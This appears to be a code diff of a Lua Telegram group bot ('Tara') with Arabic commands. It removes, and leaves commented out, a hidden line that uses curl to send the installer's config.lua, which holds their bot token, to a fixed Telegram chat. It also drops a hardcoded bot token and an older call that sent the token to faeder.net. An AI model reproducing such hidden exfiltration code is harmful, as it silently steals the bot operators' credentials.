@@ -43,7 +43,6 @@ file:write(serialized)    file:close()
 end
 local create_config_auto = function()
 
-VV = '1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4'
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..botid
 local req = https.request(getlink)
 local link = json:decode(req)
@@ -74,8 +73,7 @@ end
 
 
   
---https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
@@ -4447,8 +4445,19 @@ faederdx(msg.chat_id_, msg.id_, 1, '❀ تم اذاعه رسالتك بالتو�
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),faeder)
 end end
 --     By Developer Faeder     -- 
-if text:match("^(time)$") or text:match("^(الوقت)$")  and faeder11(msg) then
-faederdx(msg.chat_id_, msg.id_, 1, '❀ الساعه ، '..os.date("%I:%M%p")..' \n❀ التاريخ ، '..os.date("%Y/%m/%d")..' \n', 1, 'md')
+if text == "الزمن" then
+local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
+local timezone = "الساعه الان بتوقيت القاهره : "..time.."\nالتاريخ : "..os.date("%Y/%m/%d")
+faederdx(msg.chat_id_, msg.id_, 1, timezone, 1, 'md')
+end
+if text == "الساعه" or text == 'الوقت' then
+local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
+local timezone = "الساعه الان بتوقيت القاهره : "..time
+faederdx(msg.chat_id_, msg.id_, 1, timezone, 1, 'md')
+end
+if text == "التاريخ" then
+local timezone =  "التاريخ : "..os.date("%Y/%m/%d")
+faederdx(msg.chat_id_, msg.id_, 1, timezone, 1, 'md')
 end
 --     By Developer Faeder     -- 
 if text:match("^مشاهده المنشور.$") and faeder11(msg) then
@@ -4635,7 +4644,7 @@ local inline = {
 {{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}}, 
 {{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
 }
-send_inline(msg.chat_id_,'❀ فكر زين قبل لا تحذف عمري ،\n❀ لحذف حسابك اضغط علي الزر ⬇️ .',nil,inline) 
+send_inline(msg.chat_id_,'❀ فكر زين قبل لا تحذف عمري ،\n❀ لحذف حسابك اضغط علي الزر ⬇️ .',nil,inline,msg.id_/2097152/0.5) 
 return false 
 end 
 if text:match("^العاب متطوره$") or text:match("^العاب تارا$") or text:match("^العاب البوت$") or  text:match("^العاب خارقه$") or text:match("^العاب تارا$") and faeder11(msg) then
@@ -4666,17 +4675,17 @@ local inline = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}}
 }
-send_inline(msg.chat_id_,'❀ العاب متطوره سورس تارا ،\n❀ لي اختيار لعبه اضغط علي الزر ⬇️ .',nil,inline) 
+send_inline(msg.chat_id_,'❀ العاب متطوره سورس تارا ،\n❀ لي اختيار لعبه اضغط علي الزر ⬇️ .',nil,inline,msg.id_/2097152/0.5) 
 return false 
 end 
 --     كليشه السورس     -- 
 if text:match("^source$") or text:match("^سورس البوت$") or text:match("^سورس تارا$") or  text:match("^السورس$") or text:match("^سورس$") and faeder11(msg) then 
 local inline = {
-{{text="+ الـمـطـور +",url="t.me/"..SudoFaeder..""}},
+{{text="+ الـمـطـور +",url="t.me/"..SudoFaeder}},
 {{text="+ قناه السورس +",url="t.me/SOPOWERB0T"},{text="+ قناه الملفات +",url="t.me/FIPOWERB0T"}},
 {{text="+ اضف البوت الي مجموعتك +",url="http://t.me/TARA1BOT?startgroup=start"}}
 }
-send_inline(msg.chat_id_,'❀ مرحبا بك في سورس تارا┋TARA ،\n❀ اضغط علي الازرار بالاسفل ⬇️ ,',nil,inline) 
+send_inline(msg.chat_id_,'❀ مرحبا بك في سورس تارا┋TARA ،\n❀ اضغط علي الازرار بالاسفل ⬇️ ,',nil,inline,msg.id_/2097152/0.5) 
 return false 
 end
 --     By Developer Faeder     -- 
@@ -10322,9 +10331,8 @@ faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
 --     By Developer Faeder     -- 
-if text:match("^الاوامر$") and faeder11(msg) then
-local inline = {{{text="قناه السورس",url="t.me/SOPOWERB0T"}}}
-local text =  [[
+if text == 'الاوامر' and faeder11(msg) then
+local Text =[[
          •┉ • ┉ • ┉ Ͳλℜλ ┉ • ┉ • ┉•
 ❀ اليك اوامر البوت ↓↓
          •┉ • ┉ • ┉ Ͳλℜλ ┉ • ┉ • ┉•
@@ -10340,8 +10348,22 @@ local text =  [[
 ❀ مطور البوت : @]]..SudoFaeder..[[
 
 ❀ قناه السورس : @SOPOWERB0T
-]] 
-faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html') 
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = 'م1', callback_data="/help3"},{text = 'م2', callback_data="/help4"},{text = 'م3', callback_data="/help5"},
+},
+{
+{text = 'م4', callback_data="/help5"},{text = 'م5', callback_data="/help6"},{text = 'م6', callback_data="/help5"},
+},
+{
+{text = 'م7', callback_data="/help1"},{text = 'م8', callback_data="/help2"},{text = 'م9', callback_data="/help5"},
+},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
 end 
 --     By Developer Faeder     -- 
 if is_leader(msg) and text:match("^تعيين امر م1$") then
@@ -10941,7 +10963,7 @@ echo '❀ نظام التشغيل ، \n`'"$linux_version"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ الذاكره العشوائيه ،\n`'"$memUsedPrc"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ وحده التخزين ،\n`'"$HardDisk"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ المعالج ،\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
-echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ موقـع الـسـيـرفـر \n`'`curl http://th3boss.com/ip/location`'`'
+echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ موقـع الـسـيـرفـر ،\n`'`curl https://devdeiveddev.ml/IP/Location.php`'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ الدخول ،\n`'`whoami`'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ مده تشغيل السيرفر ،\n`'"$uptime"'`'
 ]]):read('*a'), 1, 'md')
